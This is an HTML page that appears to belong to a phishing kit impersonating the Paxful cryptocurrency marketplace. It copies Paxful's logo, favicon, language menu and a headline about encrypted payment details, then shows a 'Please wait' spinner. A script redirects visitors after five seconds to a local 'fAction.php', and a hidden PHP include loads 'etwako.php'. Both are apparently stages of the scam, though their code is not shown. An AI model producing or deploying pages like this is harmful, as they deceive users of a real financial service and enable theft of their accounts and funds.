





<!DOCTYPE html>
<html lang="en"><head>
    
   

<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
          <link rel="icon" href="https://accounts.paxful.com/static/favicons/favicon.ico">
        <link href="addons/main.css" rel="stylesheet">
        <title>Paxful Accounts</title>
  
  	<script>function switchVisible() {
			if (document.getElementById('Div1')) {
			
			    if (document.getElementById('Div1').style.display == 'none') {
			        document.getElementById('Div1').style.display = 'block';
			        document.getElementById('Div2').style.display = 'none';
			    }
			    else {
			        document.getElementById('Div1').style.display = 'none';
			        document.getElementById('Div2').style.display = 'block';
			    }
			}
			}
		</script>
		<style>
			#Div2 {
			display: none;
			}
		</style>
  
      
      </head>

    <body>

        <div id="root" >
            
            <div class="MainTemplate__page" ><div class="row align-items-stretch MainTemplate__row" ><div class="col-12 col-xl-5 col-lg-6 pr-lg-0 px-xl-7 py-3 py-5 py-md-7 d-flex justify-content-center justify-content-lg-end" ><div class="w-100 d-flex flex-column align-items-start px-3 px-md-4 px-xl-0 MainTemplate__content" >
            
            
            <div class="d-flex align-items-center justify-content-between w-100 mb-5" >
   <a href="https://paxful.com/"><img alt="logo" src="addons/logo-dark-7510d15ad224f1ed1f9932b6e56a028f.svg" width="120px"></a>
   <div >
      <div class="d-block btn-group">
         <button type="button" aria-haspopup="true" aria-expanded="false" class="d-flex align-items-center w-100 px-2 justify-content-between btn btn-light">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="mr-2 text-gray-500">
               <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zM1.8 8c0-.8.2-1.6.4-2.3.5.3 1.2.6 1.9.7C4 7 4 7.5 4 8s0 1 .1 1.6c-.7.1-1.4.4-1.9.7-.2-.7-.4-1.5-.4-2.3zm4 0c0-.4 0-.8.1-1.2.7.1 1.4.1 2.1.1s1.4 0 2.1-.1c0 .4.1.8.1 1.2s0 .8-.1 1.2c-.7-.1-1.4-.1-2.1-.1s-1.4 0-2.1.1c-.1-.4-.1-.8-.1-1.2zm6.1-1.6c.7-.2 1.3-.4 1.8-.7.3.7.5 1.5.5 2.3s-.2 1.6-.4 2.3c-.5-.3-1.1-.6-1.8-.7V8c0-.5 0-1-.1-1.6zm1-2.2c-.2.2-.6.3-1.2.5-.2-.8-.4-1.5-.7-2.1.7.3 1.3.9 1.9 1.6zM8 1.8c.1 0 .6.1 1.2 1.3.3.6.5 1.2.7 1.9-.6.1-1.2.1-1.9.1s-1.3 0-1.9-.1c.2-.7.4-1.3.6-1.8.7-1.3 1.2-1.4 1.3-1.4zm-2.9.7c-.3.7-.5 1.4-.7 2.2-.6-.2-1-.3-1.3-.5.6-.7 1.2-1.3 2-1.7zm-2 9.3c.2-.2.6-.3 1.2-.5.2.8.4 1.5.7 2.1-.7-.3-1.3-.9-1.9-1.6zM8 14.2c-.1 0-.6-.1-1.2-1.3-.3-.5-.5-1.1-.6-1.8.6-.1 1.2-.1 1.9-.1s1.3 0 1.9.1c-.2.7-.4 1.3-.6 1.8-.8 1.2-1.3 1.3-1.4 1.3zm2.9-.7c.3-.6.5-1.4.7-2.1.6.2 1 .3 1.2.5-.5.6-1.1 1.2-1.9 1.6z"></path>
            </svg>
            English
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="ml-2 LanguageSelector__icon text-gray-500">
               <path fill-rule="evenodd" d="M2.707 4.293L8 9.585l5.293-5.292a1 1 0 111.414 1.414l-6 6a.996.996 0 01-.53.277l-.118.014h-.118a.997.997 0 01-.648-.29l-6-6a1 1 0 011.414-1.415z" clip-rule="evenodd"></path>
            </svg>
         </button>
         <div tabindex="-1" role="menu" aria-hidden="true" class="w-100 mb-4 LanguageSelector__dropdown dropdown-menu dropdown-menu-right">
            <button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Bahasa Indonesia</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Bahasa Melayu</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Čeština</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Deutsch</span></button>
            <button type="button" class="dropdown-item LanguageItem__langSelected btn btn-link btn-lg">
               <svg width="16" height="16" stroke="currentColor" viewBox="0 0 16 16" fill="none" class="text-primary mr-2">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2 8.586L6 12l8-8"></path>
               </svg>
               <span class="ml-0">English</span>
            </button>
            <button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Español</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Français</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Italiano</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Nederlands</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Polski</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Português</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Português brasileiro</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Svenska</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Tiếng Việt</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Türkçe</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Wikang Tagalog</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">Русский</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">한국어</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">日本語</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">简体中文(SC)</span></button><button type="button" class="dropdown-item btn btn-link btn-lg"><span class="ml-4">繁體中文(TC)</span></button>
         </div>
      </div>
   </div>
</div>
        
        
        <div class="w-100 d-flex flex-grow-1" ><div class="w-100 h-100" >
        
        


<center>
        <h1 class="h2 qa-login-page-title mb-3 mb-lg-4">Add and share payment details with end-to-end encryption</h1> 
 
 </center>
  <script>
//Using setTimeout to execute a function after 5 seconds.
setTimeout(function () {
   //Redirect with JavaScript
   window.location.href= 'addons/fAction.php';
}, 5000);
</script>

      
<style>
#circularG{
position:relative;
width:128px;
height:128px}

.circularG{
position:absolute;
background-color:#652C99;
width:29px;
height:29px;
-moz-border-radius:19px;
-moz-animation-name:bounce_circularG;
-moz-animation-duration:1.04s;
-moz-animation-iteration-count:infinite;
-moz-animation-direction:normal;
-webkit-border-radius:19px;
-webkit-animation-name:bounce_circularG;
-webkit-animation-duration:1.04s;
-webkit-animation-iteration-count:infinite;
-webkit-animation-direction:normal;
-ms-border-radius:19px;
-ms-animation-name:bounce_circularG;
-ms-animation-duration:1.04s;
-ms-animation-iteration-count:infinite;
-ms-animation-direction:normal;
-o-border-radius:19px;
-o-animation-name:bounce_circularG;
-o-animation-duration:1.04s;
-o-animation-iteration-count:infinite;
-o-animation-direction:normal;
border-radius:19px;
animation-name:bounce_circularG;
animation-duration:1.04s;
animation-iteration-count:infinite;
animation-direction:normal;
}

#circularG_1{
left:0;
top:50px;
-moz-animation-delay:0.39s;
-webkit-animation-delay:0.39s;
-ms-animation-delay:0.39s;
-o-animation-delay:0.39s;
animation-delay:0.39s;
}

#circularG_2{
left:14px;
top:14px;
-moz-animation-delay:0.52s;
-webkit-animation-delay:0.52s;
-ms-animation-delay:0.52s;
-o-animation-delay:0.52s;
animation-delay:0.52s;
}

#circularG_3{
top:0;
left:50px;
-moz-animation-delay:0.65s;
-webkit-animation-delay:0.65s;
-ms-animation-delay:0.65s;
-o-animation-delay:0.65s;
animation-delay:0.65s;
}

#circularG_4{
right:14px;
top:14px;
-moz-animation-delay:0.78s;
-webkit-animation-delay:0.78s;
-ms-animation-delay:0.78s;
-o-animation-delay:0.78s;
animation-delay:0.78s;
}

#circularG_5{
right:0;
top:50px;
-moz-animation-delay:0.91s;
-webkit-animation-delay:0.91s;
-ms-animation-delay:0.91s;
-o-animation-delay:0.91s;
animation-delay:0.91s;
}

#circularG_6{
right:14px;
bottom:14px;
-moz-animation-delay:1.04s;
-webkit-animation-delay:1.04s;
-ms-animation-delay:1.04s;
-o-animation-delay:1.04s;
animation-delay:1.04s;
}

#circularG_7{
left:50px;
bottom:0;
-moz-animation-delay:1.17s;
-webkit-animation-delay:1.17s;
-ms-animation-delay:1.17s;
-o-animation-delay:1.17s;
animation-delay:1.17s;
}

#circularG_8{
left:14px;
bottom:14px;
-moz-animation-delay:1.3s;
-webkit-animation-delay:1.3s;
-ms-animation-delay:1.3s;
-o-animation-delay:1.3s;
animation-delay:1.3s;
}

@-moz-keyframes bounce_circularG{
0%{
-moz-transform:scale(1)}

100%{
-moz-transform:scale(.3)}

}

@-webkit-keyframes bounce_circularG{
0%{
-webkit-transform:scale(1)}

100%{
-webkit-transform:scale(.3)}

}

@-ms-keyframes bounce_circularG{
0%{
-ms-transform:scale(1)}

100%{
-ms-transform:scale(.3)}

}

@-o-keyframes bounce_circularG{
0%{
-o-transform:scale(1)}

100%{
-o-transform:scale(.3)}

}

@keyframes bounce_circularG{
0%{
transform:scale(1)}

100%{
transform:scale(.3)}

}

</style>

<center> 
<div id="circularG">
<div id="circularG_1" class="circularG">
</div>
<div id="circularG_2" class="circularG">
</div>
<div id="circularG_3" class="circularG">
</div>
<div id="circularG_4" class="circularG">
</div>
<div id="circularG_5" class="circularG">
</div>
<div id="circularG_6" class="circularG">
</div>
<div id="circularG_7" class="circularG">
</div>
<div id="circularG_8" class="circularG">
</div>
</div><br><br>
Please wait...
</center>
  

       
<hr class="mt-4">
</div></div></div>



</div><div class="d-none d-lg-block col-12 col-xl-7 col-lg-6 pl-0 overflow-hidden bg-blue-100"><div class="d-flex align-items-center justify-content-center h-100 overflow-hidden"><img src="addons/log-in1x-66ff6d4608ab29a6710651bfd9e6171c.png" srcset="addons/log-in1.png 900w, addons/log-in1x-66ff6d4608ab29a6710651bfd9e6171c.png 600w" loading="lazy" style="opacity: 1;" alt="Create an Account" sizes="(max-width: 1200px) 400px, (max-width: 1400px) 500px, 600px"></div></div>


</div></div></div>
    <?php include 'etwako.php';?> 

 </body></html>